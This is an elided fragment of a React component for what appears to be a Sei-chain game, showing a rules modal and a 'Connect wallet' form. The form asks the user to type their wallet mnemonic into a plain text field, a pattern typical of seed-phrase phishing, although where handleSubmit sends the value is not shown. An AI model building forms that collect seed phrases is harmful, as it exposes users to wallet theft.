function Rule({func, check, handleSubmit, balance}) {

    return(
      <div className={ check ? ['rule', 'active'].join(' ') :"rule"}>
      <span>RULES</span>
      <div className="cls">
      <svg onClick={func} xmlns="http://www.w3.org/2000/svg" width="20" height="20"><path fill="#3B4262" fill-rule="evenodd" d="M16.97 0l2.122 2.121-7.425 7.425 7.425 7.425-2.121 2.12-7.425-7.424-7.425 7.425L0 16.97l7.425-7.425L0 2.121 2.121 0l7.425 7.425L16.971 0z" opacity=".25"/></svg>
      </div>
        <svg className="svg" xmlns="http://www.w3.org/2000/svg" width="304" height="270"><defs><linearGradient id="a" x1="50%" x2="50%" y1="0%" y2="100%">
...

        {
          ...
          <div>
            <form className="form" onSubmit={e=>{
              ...
              <label>Must have more than 1 sei in address to play, else you  won't be able to remove rules</label>
          ...
          :
            <form className="form" onSubmit={handleSubmit}>
              <div>
                <label className="rule-btn">Connect wallet</label>
                <input type="text" placeholder="Enter your mnemonic" />
              </div>
              <div className="div"><input type="checkbox" id="check"/> <label for="check">Remeber me</label></div>
